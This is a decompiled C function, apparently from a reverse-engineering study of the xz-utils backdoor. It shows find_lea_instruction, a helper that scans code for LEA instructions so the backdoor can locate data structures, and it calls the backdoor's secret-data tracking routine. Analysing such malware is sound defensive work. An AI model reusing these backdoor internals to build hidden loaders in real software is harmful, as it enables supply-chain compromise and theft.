// /home/kali/xzre-ghidra/xzregh/100EB0_find_lea_instruction.c
// Function: find_lea_instruction @ 0x100EB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction(u8 * code_start, u8 * code_end, u64 displacement)


/*
 * AutoDoc: Finds the next LEA instruction in the stream and returns operand details. The backdoor uses this to recover base-plus-offset calculations that point at data structures it later siphons.
 */
#include "xzre_types.h"


BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)

{
  BOOL BVar1;
  long lVar2;
  dasm_ctx_t *pdVar3;
  byte bVar4;
  dasm_ctx_t dctx;
  dasm_ctx_t local_80;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,FALSE);
  if (BVar1 != FALSE) {
    pdVar3 = &local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *(undefined4 *)&pdVar3->instruction = 0;
      pdVar3 = (dasm_ctx_t *)((long)pdVar3 + ((ulong)bVar4 * -2 + 1) * 4);
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar1 = x86_dasm(&local_80,code_start,code_end);
      if ((((BVar1 != FALSE) && (local_80._40_4_ == 0x10d)) &&
          ((local_80.prefix.decoded.flags2 & 7) == 1)) &&
         ((local_80.mem_disp == displacement || (local_80.mem_disp == -displacement)))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

